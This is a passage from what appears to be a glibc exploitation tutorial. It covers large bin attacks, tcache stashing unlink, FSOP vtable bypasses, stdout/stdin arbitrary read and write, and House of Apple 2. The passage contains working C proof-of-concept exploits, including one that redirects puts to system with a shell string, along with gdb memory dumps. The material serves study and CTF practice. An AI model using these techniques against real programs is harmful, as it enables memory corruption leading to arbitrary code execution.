    < the next chunk (in unsorted bin yet) >
    0x6025d0:       0x0000000000000000      0x0000000000000481      <== smaller than the first
    0x6025e0:       0x0000000000602020      0x00007ffff7dd1b78
    0x6025f0:       0x0000000000000000      0x0000000000000000

main arena :

    < 66-th bin aka 2-th large bin >
    0x7ffff7dd1f98: 0x0000000000602130      0x0000000000602130      <== fwd == bck == single chunk
```

After:

```text
heap :

    < HEAD & OLD_TAIL >
    0x602130:       0x0000000000000000      0x0000000000000491
    0x602140:       0x00000000006025e0      0x00007ffff7dd1f88      <== fd points to TAIL & bk points to bin
    0x602150:       0x00000000006025e0      0x00000000006025e0      <== fd/bk_nextsize ringed on NEW TAIL (look 4.2.1. "after")

    < NEW TAIL >
    0x6025e0:       0x0000000000000000      0x0000000000000481
    0x6025f0:       0x00007ffff7dd1f88      0x0000000000602130      <== fd points to bin & bk points to OLD TAIL (also HEAD)
    0x602600:       0x0000000000602130      0x0000000000602130      <== also ringed on HEAD (also OLD TAIL)

main arena :
    < 66-th bin aka 2-th large bin >
    0x7ffff7dd1f98: 0x0000000000602130      0x00000000006025e0      <== now fwd is HEAD and bck is updated TAIL
```

Well done. Now I advise you to compile "Tail insertion PoC" without vuln and run it with gdb to check out my explanation step-by-step.

   - **4.3. Chunk larger than head:**

     - **4.3.1. `fd_nextsize`/`bk_nextsize` linking:**
       It means that new chunk must be the new head. Our mission actually is do double-linking list statement like this:

```text
 --> NEW HEAD <-> OLD HEAD (still fwd yet) <-> A <-> B <-> C <-> TAIL (bck) <--
 |____________________________________________________________________________|
```

When condition from `4.1.` returns false, allocator makes traversal from `bck` to `fwd`, where `bck` and `fd` are still `<large bin>` and `head`.
But explanation of all of those breaks out of this manual. If you interested just check `malloc.c` source.

So, when allocator detected that new chunk larger than head it does following code (`fwd == head` & `bck == tail`):

```text
P->fd_nextsize = fwd;                   <== Link NEW HEAD with OLD HEAD with fd_nextsize
P->bk_nextsize = fwd->bk_nextsize;      <== Link NEW HEAD with TAIL with bk_nextsize
fwd->bk_nextsize = P;                   <== Link OLD HEAD with NEW HEAD with bk_nextsize
P->bk_nextsize->fd_nextsize = P;        <== Link TAIL with NEW HEAD with fd_nextsize
```

Here we are! New head successfully was linked to the bin.

- **4.3.2. `fd`/`bk` linking:**
       So, we still can use that code from `4.2.3.` :) but with small fix: we want to put new chunk to tail
       it means that it's `bk` will points to bin and `fd` will points to old head.
       And allocator turns `fwd` and `bck` into:

```text
fwd = <large bin address>->fd;          <== fwd points to the old head
bck = fwd->bk;                          <== bck points to the bin (head->bk == <large bin address>)
```

And let's execute it together:

1. Link NEW HEAD with OLD HEAD with `fd` (`P->fd = fwd`)
2. Link NEW HEAD with BIN with `bk` (`P->bk = bck`)
3. Link OLD HEAD with NEW HEAD with `bk` (`fwd->bk = P`)
4. Link BIN with NEW HEAD <=> update `fwd` (`bck->fd = P`)

Fine. I also advise you to compile PoC but now for "Head insertion" and research it via gdb.

##### Exploitation Ways

OK, we actually get to understand vulnerability and exploit it!
Let's also consider two ways:

5. **Exploit tail insertion to reach once arbitrary write of heap address:**
   If we have vuln (UAF/heap overflow/another arbitrary write) which helps us to put arbitrary address to `fwd->bk_nextsize`
   we can put address of new tail there (just put `target - 0x20` to shot into `fd_nextsize` field).
   And you must overwrite `bk_nextsize` of head because `fwd` is bin pointer:

```text
*((long*)b + 3) = val - 0x20;           <== now fwd->fd->bk_nextsize = target - 0x20
```

And look at `4.2.1.` we can find (`fwd` is bin address):

```text
P->bk_nextsize = fwd->fd->bk_nextsize;  <== New tail points to target - 0x20 with bk_nextsize
```

It means that allocator trust to head's `bk_nextsize` (pointer to tail) and links new tail with old tail with `bk_nextsize`.
And 1 string of code later:

```text
P->bk_nextsize->fd_nextsize = P;        <== Finally, OLD (fake) TAIL points to NEW TAIL via fd_nextsize
```

Where `P->bk_nextsize == target - 0x20`. It means that `*(target - 0x20 + <fd_nextsize offset>)` becomes `P`.
That's all about tail insertion :)

And memory dump:

```text
< HEAD (OLD TAIL) >
0x602130:       0x0000000000000000      0x0000000000000491
0x602140:       0x00000000006025e0      0x00007ffff7dd1f88
0x602150:       0x0000000000602130      0x00000000006025e0      <== bk_nextsize points to new tail

< NEW TAIL >
0x6025e0:       0x0000000000000000      0x0000000000000481
0x6025f0:       0x00007ffff7dd1f88      0x0000000000602130
0x602600:       0x0000000000602130      0x00000000006022f0      <== bk_nextsize points to target - 0x20

< target >
0x602310:       0x00000000006025e0

< large bin >
0x7ffff7dd1f98: 0x0000000000602130      0x00000000006025e0      <== new tail at bck
```

   As you can see allocator successfully takes out overwritten `bk_nextsize` and linked NEW TAIL with "FAKE OLD TAIL" via `bk_nextsize`

6. **Exploit head insertion to reach once arbitrary write of heap address:**
   It almost like previous but here we can write the same value (address of new head) to two arbitrary addresses
   because this manipulation from allocator just trust head's `bk` (`4.3.2.`):

```text
fwd = <large bin address>->fd;          <== fwd points to the old head
bck = fwd->bk;                          <== bck points to the bin (head->bk == <large bin address>)
```

And if we do this:

```text
*((long*)b + 1) = val1 - 0x10;          <== fwd->bk = target - 0x10
*((long*)b + 3) = val2 - 0x20;
```

Allocator will overwrite our target instead of `fwd` at the large bin address at:

```text
bck->fd = P;                            <== OLD TAIL point to NEW TAIL with fd
```

And just like at point `5.` head insertion will overwrite the second target to address of new head.

Memory dump:

```text
< OLD HEAD >
0x602130:       0x0000000000000000      0x0000000000000481
0x602140:       0x00007ffff7dd1f88      0x00000000006025d0
0x602150:       0x0000000000602130      0x00000000006025d0

< NEW HEAD >
0x6025d0:       0x0000000000000000      0x0000000000000491
0x6025e0:       0x0000000000602130      0x00000000006022f0
0x6025f0:       0x0000000000602130      0x00000000006022f0

< targets >
0x602300:       0x00000000006025d0      0x0000000000000000
0x602310:       0x00000000006025d0      0x0000000000000000

< large bin >
0x7ffff7dd1f98: 0x0000000000602130      0x0000000000602130
```

   So, allocator really didn't touch `bck->fd`, but twice write addresses of new head to targets.

Fine. As you can see, the first way provides once writing at an arbitrary address but it more stealthy (double linked lists not corrupted too much).
And the second way provides double writing at arbitrary addresses, but corrupts `fwd`/`bck` at the large bin.

#### `glibc >= 2.30`

After `2.30` patch `else` block (from `4.1`) includes following macros:

1. Before `fd_nextsize`/`bk_nextsize` linking (`fwd` is a head and `bck` is a tail):

```c
if ( __glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd) )
    malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
```

2. Before `fd`/`bk` linking (`bck` is a bin address, `fwd` is a head):

```c
if (bck->fd != fwd)
    malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
```

But... Block `if` doesn't include these macros. It actually means that we can just do tail insertion technique from `4.2.` ;)

---

### 4.9 Tcache Stashing Unlink Attack (`glibc >= 2.26`)

Concept of this technique is getting arbitrary malloc via overwrite `bk` pointer of the pre-last freed chunk at smallbin.
It means that allocator tries to stash chunks from smallbin to the tcache to optimize heap (fast tcache vs slow main arena bins).
And when it reaches victim chunk with overwritten `bk` it tries to pull chunk at this address too.
Finally, that address will be pushed into tcache bin and the next allocation will return that address.

p.s. I'll show you method with `malloc()` only.
Exists easily method with `calloc()` - when you do `calloc()` allocator doesn't look at the tcache and go to main arena bins immediately.
Technique doesn't have hard divergence between that which we consider here.
Just look: `https://github.com/shellphish/how2heap/blob/master/glibc_2.40/tcache_stashing_unlink_attack.c`

#### My PoC

```c
#include <stdlib.h>

int main() {
    long* chunks[14] = {0};
    long t = <target address - 0x10>;

    for (int i = 0; i < 14; ++i) {
        if (i >= 8) malloc(0x10);  // layers to bypass unsorted chunks consolidation
        chunks[i] = malloc(0x80);
    }

    malloc(0x10);               // and the last layer

    *(long*)(t + 0x18) = t + 0x10;      // target->bk must be writeable address

    for (int i = 0; i < 14; ++i) {      // fill tcache & unsorted chunks
        free(chunks[i]);
    }

    malloc(0x90);               // move chunks from unsorted chunks to smallbin

    for (int i = 0; i < 7; ++i) {       // erase tcache bin
        chunks[i] = malloc(0x80);
    }

    /* VULN */
    chunks[13][1] = t;

    malloc(0x80);               // get a head of smallbin & trigger stashing

    long* a = malloc(0x80);         // a is the target address
    *a = 0xdeadbeef;
}
```

#### Step-by-Step Mechanics

When we try to allocate memory first of all allocator looks at the tcache, next fastbin, then main arena bins.
It means, that tcache, fastbin haven't chunks with appropriate size it will look at small/large/unsorted bins.
And first of all we must do heap grooming to put 7 chunks to the smallbin.
Next - erase whole tcache bin and overwrite `bk` of the pre-last freed chunk.
Important thing - allocator link freed chunks to the head of smallbin and does traversal from the tail.
It means that if we allocate and free to smallbin chunks `c1 - c7`, smallbin will look like:

```text
bin <-> c7 <-> c6 <-> c5 <-> c4 <-> c3 <-> c2 <-> c1 <-> bin
```

Then we try to allocate chunk, the head of smallbin will be returned.
And this is a statement of smallbin:

```text
bin <-> c6 <-> c5 <-> c4 <-> c3 <-> c2 <-> c1 <-> bin
```

Now, allocator executes this pseudo-code:

```c
while (tcache->counts[tc_idx] < mp_.tcache_count && (current = last (bin)) != bin) { // while tcache->counts of current bin less than 7 and chunks in small bin exist
    if (current) {
        bck = current->bk;          <== take chunk with bk of the tail - last (bin) returns tail chunk

        /* logic of "inuse" bit putting */

        bck->fd = bin;              <== fd of tail is bin address
        bin->bk = bck;              <== update the tail

        tcache_put (current, tc_idx);
    }
}
```

And chunks were pushed to tcache like LIFO.
After `c7` `bk` overwrite (the ring of double linked list was broken):

```text
writeable address <- fake chunk <- c6 <-> c5 <-> c4 <-> c3 <-> c2 <-> c1 <-> bin
```

Now chunks `c1 - c5` will be stashed to tcache.
Let's look at two last iterations:

- **`c6` unlink:**

```text
tcache->counts[tc_idx] == 5 and (victim = last (bin)) != bin     <== ok!
bck = victim->bk                                                <== bck is fake chunk
bck->fd = bin                                                   <== put bin address just like new tail
bin->bk = bck                                                   <== now tail of the bin is out fake chunk
```

Fine, nowhere issues.

- **fake chunk unlink:**

```text
tcache->counts[tc_idx] == 6 and (victim = last (bin)) != bin     <== still ok!
bck = victim->bk                                                <== bck is writeable address
bck->fd = bin                                                   <== put bin address also like new tail
bin->bk = bck                                                   <== and now tail is writeable address
```

After fake chunk stashing, `tcache->counts[tc_idx] == 7` ==> go out from loop.
And out fake chunk situated at the "top" of tcache bin.

#### Memory Dumps & Notes

Let's check memory at two last iterations:

```text
After c6 unlink (0x000055555555b100 is a target - 0x10):    0x7ffff7dfed90: 0x000055555555baa0      0x000055555555b100
And after fake chunk unlink :                               0x7ffff7dfed90: 0x000055555555baa0      0x000055555555b110
```

Tcache:

```text
0x55555555b000: 0x0000000000000000      0x0000000000000291
0x55555555b010: 0x0000000000000000      0x0007000000000000
            ...
0x55555555b0c0: 0x0000000000000000      0x000055555555b110
```

And after the last allocation:

```text
0x55555555b110: 0x00000000deadbeef      0x0000000000000000
0x55555555b120: 0x00007ffff7dfed80      0x0000000000000000
```

As you can see it works.

If you build fully-valid double linked list at control to write memory space you potentially can do 6 arbitrary allocations ;)
(trigger stashing when smallbin includes 2 chunks and `bk` will be valid for each evil chunk traversal).
You can also use it to leak main arena address with `bck->fd = bin`.

p.s. taking of address of current small bin independed on `tail->fd` so it will be calculated dynamically relative `\$rip` & `main_arena` & bin idx.
You can make sure it in gdb when appropriate `malloc` will be called.

---

## 5. File-Stream Oriented Programming

File-stream oriented programming aka FSOP is technique which concept is `_IO_FILE_plus` struct's low-level callbacks overwrite via substitution of `vtable` (`_IO_file_jumps` struct) pointer or `vtable` struct's fields (just like GOT-overwrite) if it's possible.

### 5.1 Key `glibc` `FILE` Structures

This is a declaration of beginning of the `FILE` structure:

```c
struct _IO_FILE
{
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;   /* Current read pointer */
  char *_IO_read_end;   /* End of get area. */
  char *_IO_read_base;  /* Start of putback+get area. */
  char *_IO_write_base; /* Start of put area. */
  char *_IO_write_ptr;  /* Current put pointer. */
  char *_IO_write_end;  /* End of put area. */
  char *_IO_buf_base;   /* Start of reserve area. */
  char *_IO_buf_end;    /* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;

  __off64_t _offset;
  void *_codecvt;
  void *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

`FILE` hexdump (`stdout` for example):

```text
0xf7fcbd60 <_IO_2_1_stdout_>:       0xfbad2887      0xf7fcbda7      0xf7fcbda7      0xf7fcbda7
0xf7fcbd70 <_IO_2_1_stdout_+16>:    0xf7fcbda7      0xf7fcbda7      0xf7fcbda7      0xf7fcbda7
0xf7fcbd80 <_IO_2_1_stdout_+32>:    0xf7fcbda8      0x00000000      0x00000000      0x00000000
0xf7fcbd90 <_IO_2_1_stdout_+48>:    0x00000000      0xf7fcb5a0      0x00000001      0x00000000
0xf7fcbda0 <_IO_2_1_stdout_+64>:    0xffffffff      0x0a000000      0xf7fcc870      0xffffffff
0xf7fcbdb0 <_IO_2_1_stdout_+80>:    0xffffffff      0x00000000      0xf7fcb4e0      0x00000000
0xf7fcbdc0 <_IO_2_1_stdout_+96>:    0x00000000      0x00000000      0xffffffff      0x00000000
0xf7fcbdd0 <_IO_2_1_stdout_+112>:   0x00000000      0x00000000      0x00000000      0x00000000
0xf7fcbde0 <_IO_2_1_stdout_+128>:   0x00000000      0x00000000      0x00000000      0x00000000
0xf7fcbdf0 <_IO_2_1_stdout_+144>:   0x00000000      0xf7fcaac0      <== _IO_jump_t
```

And this is a declaration of `vtable` structure:

```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

Finally, whole `FILE*` struct includes both of that declarations:

```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

So, as you can see - these are just a collection of meta-pointers and callbacks to handle any event (read/write/close and other).

---

### 5.2 What If We Overwrite Some Fields?

For example, I explain you on created `FILE` via `fopen`. Look: `man "fopen(3)"`.
It just creates `_IO_FILE_plus` at the heap and returns the pointer to created chunk.
Standard file streams stored in `libc` address space.

Ok, we have a several ways to reach control:

1. **Overwrite pointer to `_IO_FILE_plus`** (fine, just overwrite pointer to prepared memory space with fake `FILE`, but we must do care about whole `FILE` with `_IO_jump_t` if we work in `glibc >= 2.24`)
2. **Overwrite pointer to `_IO_jump_t`** (well - don't touch whole `FILE`. Just substitute `vtable` pointer. But works only `glibc < 2.24` if address isn't in `libc` range!)
3. **Overwrite concrete callback** (good - scoping fire without whole struct corruption, but if only `vtable`s aren't in `.rodata` section - probably not)

Each case need two conditions - arbitrary write & addresses knowledge.

Let's suppose that you have the first case. You have overwritten the `FILE` pointer to your prepared memory space, suppose `.data` in binary with `-no-pie`.
The best practice - copy initial `_IO_FILE` struct, just change `vtable`.
But depends to context we can set pointers what we need (read/write base/start/end ptrs, flags, markers and other), but this is already more advanced technique.

When program uses `fclose()` it pulls `JUMP_FIELD(_IO_close_t, __close)` from `vtable` (offset `+ 18 * BITS`).
It means that if we overwrite 18-th dword/qword (depends on `i386`/`amd64` architecture), `fclose` will pull our address instead of original `__close()`.
p.s. it maybe pulls `JUMP_FIELD(_IO_finish_t, __finish)`, but according my experience - firstly `fclose` trigger especially `__close()`.

Read-functions pull `JUMP_FIELD(_IO_xsgetn_t, __xsgetn)`. Offset 9-th dword/qword. The same logic, just like `fclose`, but another offset.
Write-functions - `JUMP_FIELD(_IO_xsputn_t, __xsputn)`. Offset 8-th.

Another callbacks called from `__close`, `__xsgetn`/`putn` (mostly).
That's all what you need to know at the beginning.

Well, but in the `glibc 2.24` and newer versions we have a one obstacle - `vtable` address validation.
It must be in range of special space among `libc` addresses.
It means that we can't just overwrite `vtable` pointer to arbitrary address with fake `vtable`.
All of these have become a cause of appearing of several following exploitation techniques.

---

### 5.3 Vtable Protections Bypass

While glibc's abstractions are having pointers to callbacks to next level of abstraction, hackers will find a way to pwn it.

#### 1. `_IO_str_jumps` - `glibc < 2.28` (I took it's layout from `https://github.com/lattera/glibc/blob/master/libio/strfile.h`)

If we are working with string-stream we'll work with special `FILE` structure:

```c
typedef struct _IO_strfile_ {
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;            <== if we can modify this
} _IO_strfile;
```

Where `_sbf` is:

```c
struct _IO_streambuf {
  _IO_FILE _f;
  const struct _IO_jump_t *vtable;
};
```

And `_s` is:

```c
struct _IO_str_fields {
  /* These members are preserved for ABI compatibility.  The glibc
     implementation always calls malloc/free for user buffers if
     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */

  _IO_alloc_type _allocate_buffer_unused; // we can modify this
  _IO_free_type _free_buffer_unused;
};
```

So, this `const struct _IO_jump_t *vtable` is `_IO_str_jumps` - special vtable for string-stream structs.
It has `JUMP_FIELD(_IO_overflow_t, __overflow)` field which uses this `_IO_alloc_type _allocate_buffer_unused` callback.
It means that if we overwrite this address and trigger `__overflow` we'll get arbitrary execution.
This callback takes an argument as a `new_size` of buffer and our problem transforms to solving of an equation with:

```c
char *_IO_buf_base; /* Start of reserve area. */
char *_IO_buf_end;  /* End of reserve area. */

new_size = 2 * old_size + 100 // where old_size = _IO_buf_end - _IO_buf_base +100 (as usual, but also can do +10. Need debug)
```

All of what we need - shift address of `_IO_str_jumps` so that target event (for example `__xputn`) pulls `__overflow` callback.
As we now, it will use `_allocate_buffer_unused` and `_IO_buf_end & _IO_buf_base` which we can control.
But don't forget to substitute buf pointers to `write_ptr >= write_end` to trigger `_allocate_buffer_unused` or try to do "honest" overflow.

p.s. `_IO_str_jumps` probably wasn't included to public symbols; search it under the `_IO_wfile_jumps`
(just check all vtables where `__overflow` different from `_IO_file/wfile_jumps` addresses)

---

### 5.4 Manipulations with `stdout` `_IO_FILE` Struct to Reach Arbitrary Read

As you can see at `5.1` `_IO_FILE` has a lot of fields such as flags, pointers, mutex etc.
If we can control `_IO_2_1_stdout_` structure we can get arbitrary read primitive via `write_base` / `write_ptr` and flags manip.

It means that we literally say: "If any function which uses `stdout` will be called - first of all
append to `stdout` all data between `write_base` and `write_ptr` addresses".

This tricky blind-attack can be used if you haven't another easier method to leak addresses but you have following conditions:

1. Arbitrary write
2. Having `libc` address near the `_IO_2_1_stdout_`
3. Partial overwrite 1-2 bytes

Let me show you an example:

Layout before overwriting:

```text
0x7ffff7bc45e0 <_IO_2_1_stderr_+160>:   0x00007ffff7bc3660      0x0000000000000000
0x7ffff7bc45f0 <_IO_2_1_stderr_+176>:   0x0000000000000000      0x0000000000000000
0x7ffff7bc4600 <_IO_2_1_stderr_+192>:   0x0000000000000000      0x0000000000000000
0x7ffff7bc4610 <_IO_2_1_stderr_+208>:   0x0000000000000000      0x00007ffff7bc26e0
0x7ffff7bc4620 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007ffff7bc46a3
0x7ffff7bc4630 <_IO_2_1_stdout_+16>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
0x7ffff7bc4640 <_IO_2_1_stdout_+32>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
0x7ffff7bc4650 <_IO_2_1_stdout_+48>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
0x7ffff7bc4660 <_IO_2_1_stdout_+64>:    0x00007ffff7bc46a4      0x0000000000000000
0x7ffff7bc4660 <_IO_2_1_stdout_+64>:    0x00007ffff7bc46a4      0x0000000000000000
0x7ffff7bc4670 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
0x7ffff7bc4680 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007ffff7bc38e0
```

At `0x7ffff7bc4640` we have `write_base` and at `0x7ffff7bc4648` `write_ptr`.
So, as arbitrary write you can use fastbin dup and do allocation to `0x7ffff7bc4610 - 0x33` (or anything another way which you can do):

```text
0x7ffff7bc45dd <_IO_2_1_stderr_+157>:   0xfff7bc3660000000      0x000000000000007f
0x7ffff7bc45ed <_IO_2_1_stderr_+173>:   0x0000000000000000      0x0000000000000000
0x7ffff7bc45fd <_IO_2_1_stderr_+189>:   0x0000000000000000      0x0000000000000000
0x7ffff7bc460d <_IO_2_1_stderr_+205>:   0x0000000000000000      0xfff7bc26e0000000
0x7ffff7bc461d <_IO_2_1_stderr_+221>:   0x00fbad288700007f      0xfff7bc46a3000000
```

Now (if we wanna get `libc` leak) we interested at overwrite flags with `_IO_IS_APPENDING` & `_IO_CURRENTLY_PUTTING` and `write_base` to any address which includes `libc` address.
As you can see, now the statement of `stdout` is: "print bytes from `0x7ffff7bc46a3` to `0x7ffff7bc46a3`".
But we'll turn it into: "print bytes from `<addr>` to `0x7ffff7bc46a3` immediately when `stdout` will be used".
And because this attack is blind we'll do the partial overwrite at the `0x7ffff7bc4640` with 1 bytes.
For example `0x20` to print all `_IO_2_1_stdout_` data where we can leak `0x00007ffff7bc46a3` ptrs from `libc`
or steal `stdin` address from `__chain` field at `0x7ffff7bc4688`.

And this is the layout after overwriting:

```text
0x7ffff7bc4620 <_IO_2_1_stdout_>:       0x00000000fbad1887      0x0000000000000000
0x7ffff7bc4630 <_IO_2_1_stdout_+16>:    0x0000000000000000      0x0000000000000000
0x7ffff7bc4640 <_IO_2_1_stdout_+32>:    0x00007ffff7bc4688      0x00007ffff7bc46a3
0x7ffff7bc4650 <_IO_2_1_stdout_+48>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
0x7ffff7bc4660 <_IO_2_1_stdout_+64>:    0x00007ffff7bc46a4      0x0000000000000000
0x7ffff7bc4670 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
0x7ffff7bc4680 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007ffff7bc38e0
```

I decided put the `__chain` address immediately to get `stdin` address at first 8 bytes of output:

```text
[DEBUG] Received 0xce bytes:
    00000000  e0 38 bc f7  ff 7f 00 00  01 00 00 00  00 00 00 00  |·8··|····|····|····|
    00000010  ff ff ff ff  ff ff ff ff  00 00 00 2a  2a 2a 2a 2a  |····|····|···*|****|
```

Well done. And now we can calculate `libc` base to continue compromise chain.

---

### 5.5 Manipulations with `stdin` `_IO_FILE` Struct to Reach Arbitrary Write

If you have `libc` (or another place to write) leak, relevant partial overwrite or another way to modify `stdin` structure you potentially can reach arbitrary write primitive (if you haven't it at the moment or it isn't strong).

It means that if you can control `_IO_2_1_stdin_.buf_base` & `_IO_2_1_stdin_.buf_end` your next data from input first of all will be stored in range `buf_base` & `buf_end`.
And if you can overwrite them you'll can write at `buf_base` address `<buf_end - buf_base>` bytes.

Let's consider an example (`WannaHeap` from `pwnable.tw`):

Code has vulnerability which gives us a way to arbitrary put zero byte.
It uses first inputed size to put null-byte to input despite of current size:

```c
*(undefined1 *)((long)chunk + old_size) = 0;
```

So, if we allocated `0x313370` bytes (with `mmap` pages were put upper the `libc`),
but inputed `0x314000 - 0x10 + libc.sym['_IO_2_1_stdin_'] + 56` previously, null byte will be put right to the `_IO_2_1_stdin_.buf_base` and it becomes point to `_IO_2_1_stdin_.buf_end`.
It means that next use of `stdin` `_IO_FILE` (`scanf`, `getchar`, `fgets` etc.) will buffer input to the space between `buf_base` and `buf_end` addresses, where `buf_end` is `_IO_2_1_stdin_.buf_end`:

```text
0x7ffff7bc18c0 <_IO_2_1_stdin_>:        0x00000000fbad208b      0x00007ffff7bc1900
0x7ffff7bc18d0 <_IO_2_1_stdin_+16>:     0x00007ffff7bc1900      0x00007ffff7bc1900
0x7ffff7bc18e0 <_IO_2_1_stdin_+32>:     0x00007ffff7bc1900      0x00007ffff7bc1900
0x7ffff7bc18f0 <_IO_2_1_stdin_+48>:     0x00007ffff7bc1900      0x00007ffff7bc1900      <== we put null byte right here
0x7ffff7bc1900 <_IO_2_1_stdin_+64>:     0x00007ffff7bc1944                              <== it points right here
```

As you can see, after putting null byte to the `0x7ffff7bc18f8`, another fields like `read_base`, `read_end`, `read_ptr` (and `write_base`/`end`/`ptr`) were synchronized and became equal to `base_buf`.

And if we'll put address larger than `_IO_2_1_stdin_.buf_end`, for example it's address `+ 0x1000`,
via `stdin` `_IO_FILE` functions, we'll can write data from `_IO_2_1_stdin_.buf_end` to `_IO_2_1_stdin_.buf_end + 0x1000`!

```text
            ...
0x7ffff7bc18f0 <_IO_2_1_stdin_+48>:     0x00007ffff7bc1900      0x00007ffff7bc1900      <== buf_base
0x7ffff7bc1900 <_IO_2_1_stdin_+64>:     0x00007ffff7bc2900                              <== buf_end
            ...
```

It means you can control whole data under `_IO_2_1_stdin_.buf_end` (`__malloc_hook`/`__morecore`, `main_arena`, `_IO_list_all` etc.).

Impact of this attack is obvious - arbitrary write. As I wrote at the introducing you also can use this technique to reach stronger primitive,
for example - when you do fastbin dup at `glibc < 2.41` and haven't properly "environment" near the space where you need to be allocated (look unaligned malloc at `6.11`),
or another less reliable write primitive.

---

### 5.6 House of Apple 2

Concept of this technique was built on vtable validate doesn't exist for `_wide_vtable` from wide chars `_IO_FILE`.
I didn't found any source of struct for `_IO_wide_data` but it doesn't matter.
You just should know that size of this structure larger than any standard stream struct (example for `x86_64`) with 16 bytes and equals `0xe8` (including `_wide_vtable`).

Fine, let's speak about architecture of key structs:

- Any valid `_IO_FILE_plus` struct includes `void *_wide_data` field as so as `struct _IO_jump_t *vtable`
- `_IO_wfile_jumps` struct is correct for vtable validate
- When something event pulls `__xputn` for example and `write_ptr >= write_end` it pulls `__overflow`
- If `__xputs` & `__overflow` were called from `_IO_wfile_jumps` we'll go to `_wide_data` field to pull properly callback `__doallocate` from `_wide_vtable`

So, if you have `libc` (and control-space for fake `_wide_data` & `_wide_vtable` placement) leak and arbitrary write primitive you can use this technique.

This is my PoC for `stdout` manip (compiled with `-o -g`; run without ASLR; absolute addresses may be different):

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    long* fake_wide_vtable = (long*)malloc(0x70);
    fake_wide_vtable[13] = 0x7ffff7c552b0;                          // system

    long* fake_wide_data = (long*)malloc(0xe0 + 0x8);
    fake_wide_data[28] = (long)fake_wide_vtable;         // vtable of fake "_IO_WFILE"

    *((long*)stdout) = 0x3b68733bfbad1810;                          // b';sh;' + valid flag 0xfbad1810
    *((long*)stdout + 6) = 2;                    // write_end
    *((long*)stdout + 5) = 3;                    // write_ptr
    *((long*)stdout + 20) = (long)fake_wide_data;          // substitute _wide_data
    *((long*)stdout + 27) = 0x7ffff7dfd468;                         // _IO_wfile_jumps

    puts("sayhi");
}
```

p.s. flag built to bypass checkings in:

```text
0x7ffff7c8871d <_IO_wfile_overflow+000d> mov    edx, DWORD PTR [rdi]                      <== edx == flag
0x7ffff7c8871f <_IO_wfile_overflow+000f> test   dl, 0x8                                   <== must set zero flag to 1
0x7ffff7c88722 <_IO_wfile_overflow+0012> jne    0x7ffff7c88870 <_IO_wfile_overflow+352>  <== skip this jump

0x7ffff7c88735 <_IO_wfile_overflow+0025> test   dh, 0x8                                   <== must set zero flag to 0
0x7ffff7c88738 <_IO_wfile_overflow+0028> jne    0x7ffff7c887e0 <_IO_wfile_overflow+208>  <== go
```

Fine, let's check it out with callstack dumps:

`stdout` layout with following fields:

```text
0x7ffff7dff7a0 <_IO_2_1_stdout_>:       0x3b68733bfbad1810      <== overwritten flag aka arg to callbacks
            ...
0x7ffff7dff840 <_IO_2_1_stdout_+160>:   0x000055555555b320      <== fake _wide_data
            ...
0x7ffff7dff870 <_IO_2_1_stdout_+208>:   0x0000000000000000      0x00007ffff7dfd468 <== _IO_wfile_jumps
```

`fake_wide_data` in heap:

```text
0x55555555b310: 0x0000000000000000      0x00000000000000f1
    ...
0x55555555b400: 0x000055555555b2a0      <== fake _wide_vtable at base + 0xe0
```

`fake_wide_vtable`:

```text
0x55555555b290: 0x0000000000000000      0x0000000000000081
    ...
0x55555555b300: 0x0000000000000000      0x00007ffff7c552b0      <== system at base + 0x68
```

1. After overwriting relevant fields we call `puts` and go to `_IO_2_1_stdout_` & pull `__xputn` FROM `_IO_wfile_jumps`:

```text
[#1] 0x7ffff7c89413 → _IO_wfile_xsputn()  <== xputn from _IO_wfile_jumps
[#2] 0x7ffff7c836a9 → puts()
```

